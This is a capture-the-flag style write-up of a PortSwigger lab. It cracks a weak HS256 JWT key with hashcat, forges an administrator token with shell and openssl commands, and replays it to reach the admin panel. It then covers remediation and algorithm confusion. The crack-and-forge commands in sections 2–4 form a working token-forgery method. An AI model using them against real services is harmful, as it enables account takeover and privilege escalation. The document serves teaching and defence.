# Part D — JWT: crack, forge, remediate

Target: PortSwigger Web Security Academy lab "JWT authentication bypass via weak signing key" (the Part A lab), attacked from Kali on 27 Nov 2026. Account: `wiener` / `peter`.

---

## 1. The token, decoded before any cracking

A JWT is three base64url strings joined by dots: `HEADER.PAYLOAD.SIGNATURE`. The first two are only encoded, not encrypted, so anyone holding the token can read them.

```
TOKEN=$(tr -d ' \r\n' < jwtD.txt)
b64d(){ local s=$(echo -n "$1" | tr '_-' '/+'); while [ $(( ${#s} % 4 )) -ne 0 ]; do s="$s="; done; echo "$s" | base64 -d; echo; }
b64d "$(echo $TOKEN | cut -d. -f1)"     # header
b64d "$(echo $TOKEN | cut -d. -f2)"     # payload
echo $TOKEN | cut -d. -f3               # signature
```

Output:

```
== HEADER
{"kid":"1f57006e-e739-43df-976f-3bfac7aa6778","alg":"HS256"}
== PAYLOAD
{"iss":"portswigger","exp":1795758023,"sub":"wiener"}
== SIGNATURE (raw bytes, base64url)
_mDqY1YsTqMwVocmaVrzD8sSDlKXNAVeU_R-ECMnUPg
```

**In my own words:**

- **Header.** `alg: HS256` means the signature is an HMAC-SHA256 made with one shared secret. The same secret signs and verifies, so if I can guess it I can sign anything. `kid` is the ID of the key the server used; it tells me there may be more than one key, but not what the key is.
- **Payload.** `iss` is who issued it (portswigger). `exp` is the expiry time as a Unix timestamp. `sub` is the subject: the username the server treats me as.
- **Signature.** 32 bytes of HMAC output over `header.payload`. It is the only thing stopping me from editing the payload.

**What an attacker learns from the payload alone, before cracking anything:**

1. **Identity is the `sub` claim and nothing else.** There is no role, user ID or permissions claim, so the server must be deciding "who you are" purely from this username. Changing `sub` to another username is the obvious target, and `administrator` is the obvious name to try.
2. **The algorithm is symmetric.** HS256 can be attacked offline: I already have a message and its signature, so I can test candidate secrets on my own machine as fast as my hardware allows, without sending a single request to the server.
3. **There is no `aud` (audience) or `iat` (issued-at) claim,** so the token is not tied to one service and its age is only bounded by `exp`.
4. **The token lasts until `exp`.** Anything I forge from it is good for the same window.

---

## 2. Crack the HS256 key (hashcat mode 16500)

Wordlist: `jwt.secrets.list` (103,979 known JWT secrets).

```
wget -q https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
hashcat -a 0 -m 16500 jwt_clean.txt jwt.secrets.list --force
hashcat -m 16500 jwt_clean.txt --show
```

`-m 16500` is hashcat's JWT mode: it takes the whole token, recomputes HMAC-SHA256 over `header.payload` for every candidate secret, and compares it with the signature. `--force` tells hashcat to run despite its device warnings; in this VM the only device is the CPU (PoCL OpenCL), which hashcat warns about.

Output (trimmed to the result lines):

```
eyJraWQiOiIxZjU3...ECMnUPg:secret1

Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Time.Started.....: Fri Nov 27 00:14:17 2026, (0 secs)
Speed.#01........:    44533 H/s
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2048/103965 (1.97%)
```

**The signing key is `secret1`.** It was recovered in under a second, after trying 2,048 of the 103,965 candidates. No traffic reached the server during the crack.

**Troubleshooting note (reproducibility).** The log shows two failed attempts before the crack:

1. `Hashfile 'jwt.txt' on line 1: Separator unmatched`. That file came from an earlier session, when pasting into the terminal with Ctrl+V had inserted invisible bracketed-paste characters, so hashcat could not find the two dots.
2. A run that produced no result, because the hashcat command still pointed at the old `jwt.txt` while the new token had been saved as `jwtD.txt`.

Saving the token with `nano` (pasting with Ctrl+Shift+V), copying it to `jwt_clean.txt` and using that one filename in every command fixed both. Check the file first with `cat -A jwt_clean.txt`: it must be a single line starting `eyJ`, with two dots and ending in `$`.

---

## 3. Forge a token with elevated privilege and re-sign it

Change `sub` from `wiener` to `administrator`, keep everything else, and sign the new `header.payload` with the cracked key.

```
SECRET=secret1
b64e(){ base64 -w0 | tr '+/' '-_' | tr -d '='; }
H=$(echo $TOKEN | cut -d. -f1)
P=$(b64d "$(echo $TOKEN | cut -d. -f2)" | sed 's/"sub":"wiener"/"sub":"administrator"/' | tr -d '\n' | b64e)
SIG=$(printf '%s' "$H.$P" | openssl dgst -sha256 -hmac "$SECRET" -binary | b64e)
FORGED="$H.$P.$SIG"
```

Output:

```
== ORIGINAL PAYLOAD
{"iss":"portswigger","exp":1795758023,"sub":"wiener"}
== FORGED PAYLOAD
{"iss":"portswigger","exp":1795758023,"sub":"administrator"}
== FORGED TOKEN
eyJraWQiOiIxZjU3MDA2ZS1l...c3ViIjoiYWRtaW5pc3RyYXRvciJ9.13HcxAdRXnQiKLCb4Ovno3W0RkuJ0mu6YwvpLCkYTVg
```

Only the middle part of the token changed (it now encodes `"sub":"administrator"`) and the signature is new. The header is reused unchanged, so `alg` stays HS256. Because the signature is now a valid HMAC under the server's real key, the server cannot tell this token from one it issued itself.

---

## 4. Replay it and show the privilege change

PortSwigger lab instances expire after a short idle period, so for the replay I opened a fresh instance, logged in as `wiener`, and repeated section 3 on that session's token with the same cracked key (`secret1`):

```
== NEW FORGED PAYLOAD
{"iss":"portswigger","exp":1795773037,"sub":"administrator"}
```

I then replaced the `session` cookie in the browser (Developer tools → Storage → Cookies) with the new forged token and opened `/admin`.

**Result (screenshot):** the admin panel loaded for the `wiener` session, which is normally refused. Deleting `carlos` returned **"User deleted successfully!"**, the user list then showed only `wiener`, and the lab reported **"Congratulations, you solved the lab!"**. The privilege change took effect: a normal user became administrator by editing one claim and re-signing it.

---

## 5. Remediation

The root cause is not just "a weak secret". It is that **anyone who learns one shared HMAC key can mint tokens for any user**, and the server trusts the `sub` claim with no other check. The fix has to remove the guessable key, pin the algorithm, and make a leaked key recoverable.

The application here is a Node.js/Express service, so the settings below are for the **`jsonwebtoken`** library (npm). Equivalent settings for PyJWT follow.

| # | Library and setting | Value | Why |
|---|---|---|---|
| 1 | **Signing key** passed to `jwt.sign()` / `jwt.verify()`, loaded from `process.env.JWT_SECRET` | **At least 256 bits (32 bytes) from a CSPRNG**, generated with `node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"`, stored in the secrets manager, never in source code | A random 256-bit key cannot be found by a wordlist and is infeasible to brute-force. `secret1` is in every public JWT wordlist. |
| 2 | **`algorithms`** option of `jwt.verify(token, key, { algorithms: [...] })` | **`['HS256']`**, exactly one algorithm | Stops the server accepting `alg: none` or switching algorithm because the token's header says so. |
| 3 | **`expiresIn`** option of `jwt.sign()` | **`'15m'`**, with a separate refresh token | Limits how long a stolen or forged token works. |
| 4 | **`issuer` and `audience`** options of both `jwt.sign()` and `jwt.verify()` | e.g. `issuer: 'auth.example.com'`, `audience: 'shop-api'` | Rejects tokens minted for another service. |
| 5 | **Key ID and rotation**: put the key ID in the `keyid` option of `jwt.sign()`; on verify, look the key up by `kid` from the server's own list | Rotate every 90 days, and immediately after any suspected leak | A leaked key can be retired without logging every user out at once. |
| 6 | **Preferred long-term fix:** switch to **asymmetric signing** | `algorithm: 'RS256'` (or `'EdDSA'`), private key only on the auth service, `jwt.verify(token, publicKey, { algorithms: ['RS256'] })` on every other service | Services that only verify never hold a key that can sign, so compromising one of them does not let an attacker mint tokens. |

Server-side authorisation should also not rest on the token alone: `/admin` should look up the user's role from the database, so that even a valid token for `administrator` must belong to a real administrator session.

**PyJWT equivalent:** `jwt.decode(token, key, algorithms=["HS256"], audience="shop-api", issuer="auth.example.com")`, with `key` = 32 random bytes from `secrets.token_bytes(32)`, and `jwt.encode({..., "exp": now + timedelta(minutes=15)}, key, algorithm="HS256")`.

### How a developer verifies the fix is live

1. **Key length.** On the server, run `node -e "console.log(Buffer.from(process.env.JWT_SECRET,'base64').length)"`. It must print **32 or more**.
2. **Repeat this attack.** Log in, take a fresh token, and run the same command: `hashcat -a 0 -m 16500 token.txt jwt.secrets.list` and then with `/usr/share/wordlists/rockyou.txt`. Both must end in **`Status: Exhausted`**, not Cracked.
3. **The old key is dead.** Sign a token with `secret1` (section 3 commands) and request `/admin`. Expect **401**.
4. **Algorithm is pinned.** Send a token with `"alg":"none"` and no signature, and one with the header changed to HS384. Both must get **401**.
5. **Expiry is enforced.** A token older than 15 minutes must get **401**.
6. **Add these as automated tests** in the API test suite, so a later change cannot silently re-introduce them.

---

## 6. RS256 → HS256 algorithm confusion

With RS256 the server signs with a private key and verifies with the matching **public** key, which is meant to be public and is often published (for example at `/.well-known/jwks.json`). If the verification code reads the algorithm from the token header instead of fixing it in configuration, an attacker can take that public key, change the header to `"alg":"HS256"`, and sign their forged token with HMAC using the public key's bytes as the secret. The server then runs HMAC verification with the same public-key bytes it was given as its "key", the HMAC matches, and the forged token is accepted. It works because the library uses one key variable for both algorithms and lets the attacker choose which algorithm that key is used with. The single line that prevents it is to pin the algorithm on verification:

```js
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

(Current versions of `jsonwebtoken`, from v9, also refuse to use an RSA public key as an HMAC secret by default, but the explicit `algorithms` list is still the control to rely on and to check for in code review, because older versions and other libraries do not have that safeguard.)
